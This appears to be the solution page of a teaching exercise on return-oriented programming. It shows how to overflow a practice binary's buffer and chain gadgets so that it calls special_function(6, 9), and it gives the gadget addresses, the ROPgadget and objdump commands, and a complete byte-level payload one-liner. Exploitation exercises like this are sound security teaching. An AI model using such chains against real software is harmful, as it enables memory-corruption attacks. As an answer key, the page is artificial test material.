---
nav_order: 1
parent: 'Task: ROP'
---

# Solution

**Objective**: Call `special_function(6, 9)` using ROP chain to set the flag.

In x86-64, function parameters are passed in registers (not on stack):

- First parameter (x=6) → **RDI** register
- Second parameter (y=9) → **RSI** register

With static linking, natural ROP gadgets from libc are available:

- `pop rdi; pop rbp; ret` at `0x402268`
- `pop rsi; pop rbp; ret` at `0x405046`

Since these gadgets also pop RBP, we need dummy values after each parameter.

**ROP Chain Structure**:

```text
[24 bytes padding] +
[pop_rdi addr] + [value 6] + [dummy] +    # Set RDI = 6
[pop_rsi addr] + [value 9] + [dummy] +    # Set RSI = 9
[special_function addr]                   # Call special_function(6, 9)
```

Find addresses:

```bash
ROPgadget --binary rop | grep "pop rdi"        # 0x402268: pop rdi; pop rbp; ret
ROPgadget --binary rop | grep "pop rsi"        # 0x405046: pop rsi; pop rbp; ret
objdump -d rop | grep "special_function>:"     # 0x401a31
```

Exploit:

```sh
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*24 +
    b"\x68\x22\x40\x00\x00\x00\x00\x00" +
    b"\x06\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x46\x50\x40\x00\x00\x00\x00\x00" +
    b"\x09\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x31\x1a\x40\x00\x00\x00\x00\x00"
)' | ./rop
```

Or using the exploit script:

```bash
./exploit.sh | ./rop
```

**Note**: The binary uses `setvbuf(stdout, NULL, _IONBF, 0)` to ensure flag output is flushed before segfault.
